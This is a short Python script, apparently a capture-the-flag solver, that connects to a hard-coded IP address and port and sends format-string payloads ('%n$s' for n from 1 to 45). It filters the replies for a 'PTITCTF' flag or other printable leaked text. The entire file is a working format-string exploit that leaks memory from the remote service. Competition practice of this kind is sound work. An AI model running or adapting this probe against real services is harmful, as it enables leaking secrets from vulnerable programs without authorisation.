#!/usr/bin/env python3
import socket, time, re
HOST="144.79.188.39"; PORT=43642
def test(n):
    try:
        s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300)
        s.send(("%%%d$s"%n).encode()+b"\n")
        d=b''
        try:
            while True:
                c=s.recv(4096)
                if not c: break
                d+=c
        except Exception: pass
        s.close(); return d
    except Exception as e:
        return b'ERR'
for n in range(1,46):
    d=test(n)
    if b'PTITCTF' in d or b'{' in d or b'flag' in d.lower() or (len(d)>5 and all(32<=b<127 for b in d if b not in (10,62))):
        print(f"%{n}$s:", repr(d))
    time.sleep(0.06)
